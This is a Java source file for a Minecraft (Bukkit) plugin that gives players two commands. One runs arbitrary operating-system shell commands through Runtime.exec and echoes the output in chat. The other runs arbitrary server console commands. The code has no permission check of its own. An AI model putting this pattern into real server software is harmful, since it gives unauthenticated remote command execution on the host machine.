package me.latiao.minecraftservershellplugin;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class main extends JavaPlugin {

    @Override
    public void onEnable() {
        getCommand("LatiaoSystemShell").setExecutor(this);
        getCommand("LatiaoMinecraftShell").setExecutor(this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("LatiaoSystemShell")) {
            if (!(sender instanceof Player)) {
                sender.sendMessage("Please execute as a player.");
                return true;
            }

            Player player = (Player) sender;

            if (args.length < 1) {
                player.sendMessage("Usage: /LatiaoSystemShell <Shell>");
                return true;
            }

            StringBuilder command = new StringBuilder();
            for (String arg : args) {
                command.append(arg).append(" ");
            }

            try {
                Process process = Runtime.getRuntime().exec(command.toString());
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                StringBuilder output = new StringBuilder();

                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                reader.close();

                player.sendMessage(output.toString());
            } catch (IOException e) {
                e.printStackTrace();
            }

            return true;
        } else if (cmd.getName().equalsIgnoreCase("LatiaoMinecraftShell")) {
            if (args.length < 1) {
                sender.sendMessage("Usage: /LatiaoMinecraftShell <Command>");
                return true;
            }

            StringBuilder command = new StringBuilder();
            for (String arg : args) {
                command.append(arg).append(" ");
            }

            getServer().dispatchCommand(getServer().getConsoleSender(), command.toString());

            return true;
        }

        return false;
    }
}